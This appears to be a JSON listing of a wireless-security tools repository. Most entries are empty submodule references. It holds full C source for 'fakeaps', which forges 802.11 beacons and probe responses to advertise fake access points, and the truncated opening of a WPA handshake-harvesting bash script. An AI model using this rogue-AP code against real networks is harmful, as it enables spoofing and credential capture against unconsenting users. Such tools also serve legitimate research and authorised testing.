          "name": "eapeak",
          "type": "commit",
          "content": null
        },
        {
          "name": "eaphammer",
          "type": "commit",
          "content": null
        },
        {
          "name": "easy-bettercap",
          "type": "commit",
          "content": null
        },
        {
          "name": "easy-creds",
          "type": "commit",
          "content": null
        },
        {
          "name": "easy-hcx",
          "type": "commit",
          "content": null
        },
        {
          "name": "ee202a",
          "type": "commit",
          "content": null
        },
        {
          "name": "eewids",
          "type": "commit",
          "content": null
        },
        {
          "name": "emc-contest-data-visualization",
          "type": "commit",
          "content": null
        },
        {
          "name": "etd",
          "type": "commit",
          "content": null
        },
        {
          "name": "evilportals",
          "type": "commit",
          "content": null
        },
        {
          "name": "fRobot",
          "type": "commit",
          "content": null
        },
        {
          "name": "fake-ap3.py",
          "type": "commit",
          "content": null
        },
        {
          "name": "fakeAP",
          "type": "commit",
          "content": null
        },
        {
          "name": "fakeaps.c",
          "type": "blob",
          "size": 19.095703125,
          "content": "/**\nFake Access Points using Atheros wireless cards in Linux\nWritten by Evan Jones <ejones@uwaterloo.ca>\n\nReleased under a BSD Licence\n\nHow to Use:\n1. Customize the array of access points below, if you want.\n2. Bring up your Atheros interface on the desired channel.\n3. Enable the raw device (echo \"1\" > /proc/sys/dev/ath0/rawdev)\n4. Configure the raw device to use radiotap headers (echo \"2\" > /proc/sys/dev/ath0/rawdev_type)\n5. Bring up the raw device (ifconfig ath0raw up)\n6. Start this program (./fakeaps ath0raw [channel number for ath0])\n\nHow to Compile:\n1. Get the \"ieee80211.h\" and \"ieee80211_radiotap.h\" headers from the MadWiFi\ndistribution:\n\nhttp://cvs.sourceforge.net/viewcvs.py/madwifi/madwifi/net80211/\n\n2. gcc --std=gnu99 -Wall -o fakeaps fakeaps.c\n\n\nThanks go out to John Bicket for his help in getting the raw device to work\ncorrectly, and getting it included in the MadWiFi driver.\n\nhttp://pdos.csail.mit.edu/~jbicket/\n\nThanks also to Sebastian Weitzel for his athrawsend program:\n\nhttp://www.togg.de/stuff/athrawsend.c\n*/\n\n#include <sys/types.h>\n#include <sys/ioctl.h>\n#include <sys/socket.h>\n\n#include <stdio.h>\n#include <string.h>\n#include <assert.h>\n#include <stdlib.h>\n\n#include <unistd.h>\n\n#include <netinet/in.h>\n\n#include <net/if.h>\n#include <linux/if_packet.h>\n#include <linux/if_ether.h>\n\n#include <sys/time.h>\n#include <time.h>\n\n#define __packed __attribute__((__packed__))\n#include  \"ieee80211.h\"\n#include  \"ieee80211_radiotap.h\"\n\nint openSocket( const char device[IFNAMSIZ] )\n{\n\tstruct ifreq ifr;\n\tstruct sockaddr_ll ll;\n\tconst int protocol = ETH_P_ALL;\n\tint sock = -1;\n\t\n\tassert( sizeof( ifr.ifr_name ) == IFNAMSIZ );\n\n\tsock = socket( PF_PACKET, SOCK_RAW, htons(protocol) );\n\tif ( sock < 0 )\n\t{\n\t\tperror( \"socket failed (do you have root priviledges?)\" );\n\t\treturn -1;\n\t}\n\t\n\tmemset( &ifr, 0, sizeof( ifr ) );\n\tstrncpy( ifr.ifr_name, device, sizeof(ifr.ifr_name) );\n\tif (ioctl(sock, SIOCGIFINDEX, &ifr) < 0)\n\t{\n\t\tperror(\"ioctl[SIOCGIFINDEX]\");\n\t\tclose(sock);\n\t\treturn -1;\n\t}\n\n\tmemset( &ll, 0, sizeof(ll) );\n\tll.sll_family = AF_PACKET;\n\tll.sll_ifindex = ifr.ifr_ifindex;\n\tll.sll_protocol = htons(protocol);\n\tif ( bind( sock, (struct sockaddr *) &ll, sizeof(ll) ) < 0 ) {\n\t\tperror( \"bind[AF_PACKET]\" );\n\t\tclose( sock );\n\t\treturn -1;\n\t}\n\t\t\n\t// Enable promiscuous mode\n\t//~ struct packet_mreq mr;\n\t//~ memset( &mr, 0, sizeof( mr ) );\n\t\n\t//~ mr.mr_ifindex = ll.sll_ifindex;\n\t//~ mr.mr_type    = PACKET_MR_PROMISC;\n\n\t//~ if( setsockopt( sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof( mr ) ) < 0 )\n\t//~ {\n\t\t//~ perror( \"setsockopt[PACKET_MR_PROMISC]\" );\n\t\t//~ close( sock );\n\t\t//~ return -1;\n\t//~ }\n\t\n\treturn sock;\n}\n\nvoid packet_hexdump(const uint8_t* data, size_t size)\n{\n\tsize_t i;\n\n\tprintf(\"%02x:\", data[0]);\n\tfor(i=1; i<size; i++){\n\t\tprintf(\"%02x:\", data[i]);\n\t\tif ( (i & 0xf)  == 0xf )\n\t\t{\n\t\t\t// Add a carrage return every 16 bytes\n\t\t\tprintf( \"\\n\" );\n\t\t}\n\t}\n\tprintf(\"\\n\\n\");\n}\n\ntypedef struct {\n  uint32_t msgcode;\n  uint32_t msglen;\n#define WLAN_DEVNAMELEN_MAX 16\n  uint8_t devname[WLAN_DEVNAMELEN_MAX];\n  uint32_t hosttime;\n  uint32_t mactime;\n  uint32_t channel;\n  uint32_t rssi;\n  uint32_t sq;\n  uint32_t signal;\n  uint32_t noise;\n  uint32_t rate;\n  uint32_t istx;\n  uint32_t frmlen;\n} wlan_ng_prism2_header;\n\n/** Get the current 802.11 64-bit timestamp from the system time. */\nuint64_t getCurrentTimestamp()\n{\n\tstruct timeval t;\n\t\n\tint code = gettimeofday( &t, NULL );\n\tassert( code == 0 );\n\tif ( code != 0 )\n\t{\n\t\tperror( \"error calling gettimeofday\" );\n\t\tassert( 0 );\n\t}\n\t\n\t// Convert seconds to microseconds\n\t// For the purposes of 802.11 timestamps, we don't care about what happens\n\t// when this value wraps. As long as the value wraps consistently, we are\n\t// happy\n\tuint64_t timestamp = t.tv_sec * 1000000LL;\n\ttimestamp += t.tv_usec;\n\t\n\treturn timestamp;\n}\n\n/** Add increment microseconds to time, computing the overflow correctly. */\nvoid incrementTimeval( struct timeval* time, suseconds_t increment )\n{\n\tassert( time != NULL );\n\tassert( 0 <= time->tv_usec && time->tv_usec < 1000000 );\n\t\n\tif ( increment >= 1000000 )\n\t{\n\t\t// Add the seconds to the seconds field, and keep the remainder\n\t\ttime->tv_sec += (increment/1000000);\n\t\tincrement = increment % 1000000;\n\t}\n\t\n\tassert( increment < 1000000 );\n\t\n\ttime->tv_usec += increment;\n\tif ( time->tv_usec >= 1000000 )\n\t{\n\t\ttime->tv_sec += 1;\n\t\ttime->tv_usec -= 1000000;\n\t\t\n\t\tassert( 0 <= time->tv_usec && time->tv_usec < 1000000 );\n\t}\n}\n\n/** Computes \"second = first - second\" including the underflow \"borrow.\" */ \nvoid differenceTimeval( const struct timeval* first, struct timeval* second )\n{\n\tassert( first != NULL );\n\tassert( second != NULL );\n\t\n\tsecond->tv_sec = first->tv_sec - second->tv_sec;\n\tsecond->tv_usec = first->tv_usec - second->tv_usec;\n\t\n\t// If underflow occured, borrow a second from the higher field\n\tif ( second->tv_usec < 0 )\n\t{\n\t\tsecond->tv_sec -= 1;\n\t\tsecond->tv_usec += 1000000;\n\t\t\n\t\t// If this assertion fails, the initial timevals had invalid values\n\t\tassert( 0 <= second->tv_usec && second->tv_usec < 1000000 );\n\t}\n}\n\n/** Returns a negative integer if first < second, zero if first == second, and a positive integer if first > second. */\nint compareTimeval( const struct timeval* first, const struct timeval* second )\n{\n\tint difference = first->tv_sec - second->tv_sec;\n\tif ( difference == 0 )\n\t{\n\t\t// If the seconds fields are equal, compare based on the microseconds\n\t\tdifference = first->tv_usec - second->tv_usec;\n\t}\n\t\n\treturn difference;\n}\n\nstruct AccessPointDescriptor\n{\n\tuint8_t macAddress[IEEE80211_ADDR_LEN];\n\tconst uint8_t* ssid;\n\tsize_t ssidLength;\n\tconst uint8_t* dataRates;\n\tsize_t dataRatesLength;\n};\n\nstatic const uint8_t IEEE80211_BROADCAST_ADDR[IEEE80211_ADDR_LEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };\nstatic const uint8_t IEEE80211B_DEFAULT_RATES[] = { \n\tIEEE80211_RATE_BASIC | 2,\n\tIEEE80211_RATE_BASIC | 4,\n\t11,\n\t22,\n};\n//~ static const size_t IEEE80211B_DEFAULT_RATES_LENGTH = sizeof(IEEE80211B_DEFAULT_RATES);\n#define IEEE80211B_DEFAULT_RATES_LENGTH sizeof(IEEE80211B_DEFAULT_RATES)\n\nstruct ieee80211_beacon {\n\tu_int64_t beacon_timestamp;\n\tu_int16_t beacon_interval;\n\tu_int16_t beacon_capabilities;\n} __attribute__((__packed__));\n\nstruct ieee80211_info_element {\n\tu_int8_t info_elemid;\n\tu_int8_t info_length;\n\tu_int8_t* info[0];\n} __attribute__((__packed__));\n\n/** Converts a 16-bit integer from host byte order to little-endian byte order. Not implement yet. */\ninline uint16_t htole16( uint16_t src ) { return src; }\n\n#define BEACON_INTERVAL 102400\n\n/** Returns a beacon packet for the specified descriptor. The packet will be allocated using malloc. */\nuint8_t* constructBeaconPacket( uint8_t dataRate, uint8_t channel, const struct AccessPointDescriptor* apDescription, size_t* beaconLength )\n{\n\t// Validate parameters\n\tassert( apDescription != NULL );\n\tassert( beaconLength != NULL );\n\t\n\tassert( 0 <= apDescription->ssidLength && apDescription->ssidLength <= 32 );\n\tassert( 1 <= apDescription->dataRatesLength && apDescription->dataRatesLength <= 8 );\n\t\n\tuint8_t dataRateValue = (dataRate & IEEE80211_RATE_VAL);\n\t// For 802.11b, either 1 or 2 Mbps is the permitted rate for broadcasts\n\t// For 802.11a, 6Mbps is the permitted rate for broadcasts\n\tassert( dataRateValue == 0x02 || dataRateValue == 0x04 || dataRateValue == 0x12 ); \n\t\n\t// Packet size: radiotap header + 1 byte for rate + ieee80211_frame header + beacon info + tags\n\t*beaconLength = sizeof(struct ieee80211_radiotap_header) + sizeof(dataRate) +\n\t\tsizeof(struct ieee80211_frame) + sizeof(struct ieee80211_beacon) +\n\t// SSID, rates, channel\n\t\tsizeof(struct ieee80211_info_element)*3 + apDescription->ssidLength +\n\t\tapDescription->dataRatesLength + sizeof(channel);\n\t\n\tuint8_t* packet = (uint8_t*) malloc( *beaconLength );\n\tassert( packet != NULL );\n\tif ( packet == NULL )\n\t{\n\t\treturn NULL;\n\t}\n\t\n\tsize_t remainingBytes = *beaconLength;\n\t\n\t// Add the radiotap header\n\tassert( remainingBytes >= sizeof(struct ieee80211_radiotap_header) );\n\tstruct ieee80211_radiotap_header* radiotap = (struct ieee80211_radiotap_header*) packet;\n\tuint8_t* packetIterator = packet + sizeof(*radiotap);\n\tremainingBytes -= sizeof(*radiotap);\n\t\n\tradiotap->it_version = 0;\n\tradiotap->it_len = sizeof(*radiotap) + sizeof(dataRate);\n\tradiotap->it_present = (1 << IEEE80211_RADIOTAP_RATE);\n\t\n\t// Add the data rate for the radiotap header\n\tassert( remainingBytes >= sizeof(dataRate) );\n\t*packetIterator = (dataRate & IEEE80211_RATE_VAL);\n\tpacketIterator ++;\n\tremainingBytes -= sizeof(dataRate);\n\t\n\t// Build the 802.11 header\n\tassert( remainingBytes >= sizeof(struct ieee80211_frame) );\n\tstruct ieee80211_frame* dot80211 = (struct ieee80211_frame*) packetIterator;\n\tpacketIterator += sizeof(*dot80211);\n\tremainingBytes -= sizeof(*dot80211);\n\t\n\t// Beacon packet flags\n\tdot80211->i_fc[0] = IEEE80211_FC0_VERSION_0 | IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_BEACON;\n\tdot80211->i_fc[1] = IEEE80211_FC1_DIR_NODS;\n\tdot80211->i_dur[0] = 0x0;\n\tdot80211->i_dur[1] = 0x0;\n\t// Destination = broadcast (no retries)\n\tmemcpy( dot80211->i_addr1, IEEE80211_BROADCAST_ADDR, IEEE80211_ADDR_LEN );\n\t// Source = our own mac address\n\tmemcpy( dot80211->i_addr2, apDescription->macAddress, IEEE80211_ADDR_LEN );\n\t// BSS = our mac address\n\tmemcpy( dot80211->i_addr3, apDescription->macAddress, IEEE80211_ADDR_LEN );\n\t// Sequence control: Automatically set by the driver\n\t\n\t// Add the beacon frame\n\tassert( remainingBytes >= sizeof(struct ieee80211_beacon) );\n\tstruct ieee80211_beacon* beacon = (struct ieee80211_beacon*) packetIterator;\n\tpacketIterator += sizeof(*beacon);\n\tremainingBytes -= sizeof(*beacon);\n\t\n\tbeacon->beacon_timestamp = 0;\n\t// interval = 100 \"time units\" = 102.4 ms\n\t// Each time unit is equal to 1024 us\n\tbeacon->beacon_interval = htole16( BEACON_INTERVAL/1024 );\n\t// capabilities = sent by ESS\n\tbeacon->beacon_capabilities = htole16( 0x0001 );\n\t\n\t// Add the SSID\n\tassert( remainingBytes >= sizeof(struct ieee80211_info_element) + apDescription->ssidLength );\n\tstruct ieee80211_info_element* info = (struct ieee80211_info_element*) packetIterator;\n\tpacketIterator += sizeof(struct ieee80211_info_element) + apDescription->ssidLength;\n\tremainingBytes -= sizeof(struct ieee80211_info_element) + apDescription->ssidLength;\n\t\n\tinfo->info_elemid = IEEE80211_ELEMID_SSID;\n\tinfo->info_length = apDescription->ssidLength;\n\tmemcpy( info->info, apDescription->ssid, apDescription->ssidLength );\n\t\n\t// Add the data rates\n\tassert( remainingBytes >= sizeof(struct ieee80211_info_element) + apDescription->dataRatesLength );\n\tinfo = (struct ieee80211_info_element*) packetIterator;\n\tpacketIterator += sizeof(struct ieee80211_info_element) + apDescription->dataRatesLength;\n\tremainingBytes -= sizeof(struct ieee80211_info_element) + apDescription->dataRatesLength;\n\t\n\tinfo->info_elemid = IEEE80211_ELEMID_RATES;\n\tinfo->info_length = apDescription->dataRatesLength;\n\tmemcpy( info->info, apDescription->dataRates, apDescription->dataRatesLength );\n\t\n\t// Add the channel\n\tassert( remainingBytes >= sizeof(struct ieee80211_info_element) + sizeof(channel) );\n\tinfo = (struct ieee80211_info_element*) packetIterator;\n\tpacketIterator += sizeof(struct ieee80211_info_element) + sizeof(channel);\n\tremainingBytes -= sizeof(struct ieee80211_info_element) + sizeof(channel);\n\t\n\tinfo->info_elemid = IEEE80211_ELEMID_DSPARMS;\n\tinfo->info_length = sizeof(channel);\n\tmemcpy( info->info, &channel, sizeof(channel) );\n\t\n\tassert( remainingBytes == 0 );\n\treturn packet;\n}\n\nvoid transmitProbeResponse( int rawSocket, uint8_t* beaconPacket, size_t beaconLength, const uint8_t* destinationMAC )\n{\n\t// Probe responses are identical to beacon packets, except that\n\t// they are directed and not broadcast, and they are\n\t// set to be the probe response type\n\t\n\t// Find the 802.11 frame\n\tstruct ieee80211_radiotap_header* radiotap = (struct ieee80211_radiotap_header*) beaconPacket;\n\tstruct ieee80211_frame* dot80211 = (struct ieee80211_frame*) (beaconPacket + radiotap->it_len);\n\t\n\tdot80211->i_fc[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_PROBE_RESP;\n\tmemcpy( dot80211->i_addr1, destinationMAC, IEEE80211_ADDR_LEN );\n\t\t\n\t// Send the packet\n\tssize_t bytes = write( rawSocket, beaconPacket, beaconLength );\n\tassert( bytes == (ssize_t) beaconLength );\n\t\n\t// Set the values back to what they should be for broadcast packets\n\tdot80211->i_fc[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_BEACON;\n\tmemcpy( dot80211->i_addr1, IEEE80211_BROADCAST_ADDR, IEEE80211_ADDR_LEN );\n}\n\n// ADD MORE ACCESS POINTS HERE, IF YOU WANT\nstatic struct AccessPointDescriptor ap0 = {\n\t{ 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc },\n\t(const uint8_t*) \"ap0\", 3,\n\tIEEE80211B_DEFAULT_RATES, IEEE80211B_DEFAULT_RATES_LENGTH,\n};\n\nstatic struct AccessPointDescriptor ap1 = {\n\t{ 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54 },\n\t(const uint8_t*) \"ap1\", 3,\n\tIEEE80211B_DEFAULT_RATES, IEEE80211B_DEFAULT_RATES_LENGTH,\n};\n\n// Clients will only rarely detect this access point\n// I think it takes too long to get to this probe response\nstatic struct AccessPointDescriptor ap2 = {\n\t{ 0xde, 0xad, 0xbe, 0xef, 0xff, 0xff },\n\t(const uint8_t*) \"ap2\", 3,\n\tIEEE80211B_DEFAULT_RATES, IEEE80211B_DEFAULT_RATES_LENGTH,\n};\n\nstatic struct AccessPointDescriptor ap3 = {\n\t{ 0xca, 0xfe, 0x00, 0xba, 0xbe, 0x00 },\n\t(const uint8_t*) \"ap3\", 3,\n\tIEEE80211B_DEFAULT_RATES, IEEE80211B_DEFAULT_RATES_LENGTH,\n};\n\nstatic const struct AccessPointDescriptor* accessPoints[] = {\n\t&ap0, &ap1, &ap2, &ap3,\n};\nstatic const size_t numAccessPoints = sizeof(accessPoints) / sizeof(*accessPoints);\n\n/** These offsets start from the beginning of the 802.11 frame. */\nstatic const size_t PROBE_SSID_OFFSET = sizeof( struct ieee80211_frame );\nstatic const size_t BEACON_TIMESTAMP_OFFSET = sizeof( struct ieee80211_frame );\n\nvoid help()\n{\n\tprintf( \"fakeaps [atheros raw device] [channel it is tuned to]\\n\" );\n}\n\nint main(int argc, char *argv[])\n{\n\tif ( argc != 3 )\n\t{\n\t\thelp();\n\t\treturn 1;\n\t}\n\t\n\tlong int channel = strtol( argv[2], NULL, 10 );\n\tif ( channel <= 0 || 255 <= channel )\n\t{\n\t\tprintf( \"The channel must be between 1 and 255.\\n\" );\n\t\thelp();\n\t\treturn 1;\n\t}\n\t\n\t// The 802.11b base broadcast rate\n\tconst uint8_t dataRate = 0x4;\n\tconst char* device = argv[1];\n\t\t\n\t// Construct the beacon packets\n\tsize_t* beaconLengths = (size_t*) malloc( sizeof(size_t) * numAccessPoints );\n\tassert( beaconLengths != NULL );\n\tuint8_t** beaconPackets = (uint8_t**) malloc( sizeof(uint8_t*) * numAccessPoints );\n\tassert( beaconLengths != NULL );\n\t\n\tfor ( size_t i = 0; i < numAccessPoints; ++ i )\n\t{\n\t\tbeaconPackets[i] = constructBeaconPacket( dataRate, channel, accessPoints[i], &beaconLengths[i] );\n\t\tassert( beaconPackets[i] != NULL );\n\t\tassert( beaconLengths[i] > 0 );\n\t}\n\n\t// Open the raw device\n\tint rawSocket = openSocket( device );\n\tif ( rawSocket < 0 )\n\t{\n\t\tfprintf( stderr, \"error opening socket\\n\" );\n\t\treturn 1;\n\t}\n\t\n\t// Configure the initial timeout\n\tstruct timeval now;\n\tint code = gettimeofday( &now, NULL );\n\tassert( code == 0 );\n\t\n\tstruct timeval beaconTime = now;\n\tincrementTimeval( &beaconTime, BEACON_INTERVAL );\n\t\n\t// This is used to change the sequence of the probe response messages\n\t// In order to help clients find more of our fake access points\n\tsize_t lastProbeStartIndex = 0;\n\t\n\twhile ( 1 )\n\t{\n\t\t// We need to wait until one of two conditions:\n\t\t// 1. The \"sockin\" socket has data for us\n\t\t// 2. The beacon interval (102400 microseconds) has expired\n\t\tfd_set readfds;\n\t\tFD_ZERO( &readfds );\n\t\tFD_SET( rawSocket, &readfds );\n\t\t\n\t\tstruct timeval timeout = now;\n\t\tdifferenceTimeval( &beaconTime, &timeout );\n\t\tint numFds = select( rawSocket+1, &readfds, NULL, NULL, &timeout );\n\t\tassert( numFds >= 0 );\n\t\tif ( numFds < 0 )\n\t\t{\n\t\t\tperror( \"select failed\" );\n\t\t\treturn 1;\n\t\t}\n\t\t\n\t\tif ( numFds == 1 )\n\t\t{\n\t\t\t// We have a packet waiting: Read it\n\t\t\tuint8_t packetBuffer[4096];\n\t\t\tssize_t bytes = read( rawSocket, packetBuffer, sizeof(packetBuffer) );\n\t\t\tif ( bytes < 0 )\n\t\t\t{\n\t\t\t\tperror( \"read failed\" );\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t\n\t\t\t// Move past the radiotap header\n\t\t\tassert( bytes >= (ssize_t) sizeof( struct ieee80211_radiotap_header ) );\n\t\t\tstruct ieee80211_radiotap_header* radiotap = (struct ieee80211_radiotap_header*) packetBuffer;\n\t\t\tassert( radiotap->it_version == 0 );\n\t\t\tassert( bytes >= radiotap->it_len );\n\t\t\tuint8_t* packetIterator = packetBuffer + radiotap->it_len;\n\t\t\tsize_t remainingBytes = bytes - radiotap->it_len;\n\t\t\t\n\t\t\t// Get the 802.11 frame:\n\t\t\t// NOTE: This frame structure is larger than some packet types, so only read the initial bytes\n\t\t\tstruct ieee80211_frame* frame = (struct ieee80211_frame*)( packetIterator );\n\t\t\t\n\t\t\t// Check to see if this is a PROBE_REQUEST\n\t\t\tassert( (frame->i_fc[0] & IEEE80211_FC0_VERSION_MASK) == IEEE80211_FC0_VERSION_0 );\n\t\t\t\n\t\t\tif ( (frame->i_fc[0] & IEEE80211_FC0_TYPE_MASK) == IEEE80211_FC0_TYPE_MGT &&\n\t\t\t\t(frame->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) == IEEE80211_FC0_SUBTYPE_PROBE_REQ )\n\t\t\t{\n\t\t\t\t//~ packet_hexdump( (const uint8_t*) frame, remainingBytes );\n\t\t\t\t\n\t\t\t\t// Locate the SSID\n\t\t\t\tassert( remainingBytes >= PROBE_SSID_OFFSET );\n\t\t\t\tpacketIterator += PROBE_SSID_OFFSET;\n\t\t\t\tremainingBytes -= PROBE_SSID_OFFSET;\n\t\t\t\tstruct ieee80211_info_element* info = (struct ieee80211_info_element*) packetIterator;\n\t\t\t\tassert( remainingBytes >= sizeof(*info) );\n\t\t\t\tpacketIterator += sizeof(*info);\n\t\t\t\tremainingBytes -= sizeof(*info);\n\t\t\t\tassert( remainingBytes >= info->info_length );\n\t\t\t\t\n\t\t\t\t// See if it is a broadcast ssid (zero length SSID)\n\t\t\t\tif ( info->info_length == 0 )\n\t\t\t\t{\n\t\t\t\t\t//~ printf( \"broadcast probe request!\\n\");\n\t\t\t\t\t\n\t\t\t\t\t// Start with the next index for the next broadcast probe\n\t\t\t\t\tsize_t index = lastProbeStartIndex;\n\t\t\t\t\tlastProbeStartIndex += 1;\n\t\t\t\t\tif ( lastProbeStartIndex >= numAccessPoints )\n\t\t\t\t\t{\n\t\t\t\t\t\tlastProbeStartIndex = 0;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// Transmit responses for all access points\n\t\t\t\t\tfor ( size_t i = 0; i < numAccessPoints; ++ i )\n\t\t\t\t\t{\n\t\t\t\t\t\tif ( index >= numAccessPoints )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tindex = 0;\n\t\t\t\t\t\t}\n\t\t\t\t\t\ttransmitProbeResponse( rawSocket, beaconPackets[index], beaconLengths[index], frame->i_addr2 );\n\t\t\t\t\t\tindex += 1;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\t// Check if the SSID matches any of ours\n\t\t\t\t\tfor ( size_t i = 0; i < numAccessPoints; ++ i )\n\t\t\t\t\t{\n\t\t\t\t\t\tif ( info->info_length == accessPoints[i]->ssidLength && memcmp( info->info, accessPoints[i]->ssid, info->info_length ) == 0 )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// It does!\n\t\t\t\t\t\t\t//~ printf( \"probe for SSID '%.*s'\\n\", info->info_length, (char*) info->info );\n\t\t\t\t\t\t\ttransmitProbeResponse( rawSocket, beaconPackets[i], beaconLengths[i], frame->i_addr2 );\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// We should only have 1 or 0 fds ready\n\t\t\tassert( numFds == 0 );\n\t\t}\n\t\t\n\t\t// Get the current time to calculate how much longer we need to wait\n\t\t// or if we need to send a beacon now\n\t\tint code = gettimeofday( &now, NULL );\n\t\tassert( code == 0 );\n\t\t\n\t\tif ( compareTimeval( &beaconTime, &now ) <= 0 )\n\t\t{\n\t\t\t//~ printf( \"beacon\\n\" );\n\t\t\t// The timeout has expired. Send out the beacons\n\t\t\t// TODO: Update the timestamp in the beacon packets\n\t\t\tfor ( size_t i = 0; i < numAccessPoints; ++ i )\n\t\t\t{\n\t\t\t\tssize_t bytes = write( rawSocket, beaconPackets[i], beaconLengths[i] );\n\t\t\t\tassert( bytes == (ssize_t) beaconLengths[i] );\n\t\t\t\tif ( bytes < (ssize_t) beaconLengths[i] )\n\t\t\t\t{\n\t\t\t\t\tperror( \"error sending packet\" );\n\t\t\t\t\treturn 1;\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t// Increment the next beacon time until it is in the future\n\t\t\tdo {\n\t\t\t\tincrementTimeval( &beaconTime, BEACON_INTERVAL );\n\t\t\t} while( compareTimeval( &beaconTime, &now ) <= 0 );\n\t\t}\n\t}\n\t\n\tclose( rawSocket );\n\tfree( beaconPackets );\n\tfree( beaconLengths );\n}\n"
        },
        {
          "name": "fern-wifi-cracker",
          "type": "commit",
          "content": null
        },
        {
          "name": "find-lf",
          "type": "commit",
          "content": null
        },
        {
          "name": "fixsum",
          "type": "commit",
          "content": null
        },
        {
          "name": "frame-randomizer",
          "type": "commit",
          "content": null
        },
        {
          "name": "frame-utils.js",
          "type": "commit",
          "content": null
        },
        {
          "name": "geoprobe",
          "type": "commit",
          "content": null
        },
        {
          "name": "geowifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "get-rssi",
          "type": "commit",
          "content": null
        },
        {
          "name": "gopacket-80211",
          "type": "commit",
          "content": null
        },
        {
          "name": "gr-ieee802-11",
          "type": "commit",
          "content": null
        },
        {
          "name": "gr-ieee80211ah",
          "type": "commit",
          "content": null
        },
        {
          "name": "greaver",
          "type": "commit",
          "content": null
        },
        {
          "name": "gtaiad",
          "type": "commit",
          "content": null
        },
        {
          "name": "haiku-wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "haircrack",
          "type": "commit",
          "content": null
        },
        {
          "name": "handshakeharvest-K1-K2-K2016-4-0.sh",
          "type": "blob",
          "size": 71.125,
          "content": "#!/bin/bash\n#\n# #--------------------------------------------------------------------------------------------------------------------#\n#\n#\n# Copyright (C) 2016  Musketteams\n#\n# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public \n# License as published by the Free Software Foundation; either version 2 of the License, or any later version.\n# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied \n# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\n# You should have received a copy of the GNU General Public License along with this program; if not, write to the\n# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n# #--------------------------------------------------------------------------------------------------------------------#\n#\n# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.\n\n# Once released to the community this work belongs to the community\n# No Youtube downloads will ever be made by Musket Teams.\n# \n\n# Note to MTeam field programmers\n# DEAD DNA\n# A aircrack-ng module is left in REM. Problem with time rqr to complete process caused REM\n# This module not completly tested. The module runs aircrack-ng in xterm to find WPAkey\n# However vagaries in time rqr to complete caused REM until a balance can be found.\n# However solution doubtful. \n#\nscan_fn()\n\n{\ntput sc\niw $DEV scan &>dev\\null\necho -e \"$warn            <- ^ ->$txtrst             \"\necho -e \"            S                   \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"           <-- ^ -->            \"\necho -e \"            Sc                  \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"          <--- ^ --->           \"\necho -e \"            Sca                 \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"         <---- ^ ---->          \"\necho -e \"            Scan                \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"        <----- ^ ----->         \"\necho -e \"            Scann               \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"       <------ ^ ------>        \"\necho -e \"            Scanni              \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"      <------- ^ ------->       \"\necho -e \"            Scannin             \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"     <-------- ^ -------->      \"\necho -e \"            Scanning            \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"    $warn<$txrst--------- ^ ---------$warn>$txtrst     \"\necho -e \"            Scanning            \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"     <-------- ^ -------->      \"\necho -e \"            Scannin             \"\necho -e \"               |                \"\necho -e \"               |                \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"              |||               \"\necho -e \"  ---------------------------   \"\nsleep .1\ntput rc\ntput ed\necho -e \"      <------- ^ ------->       \"\necho -e \"            Scanni              \"\necho -e \"               |             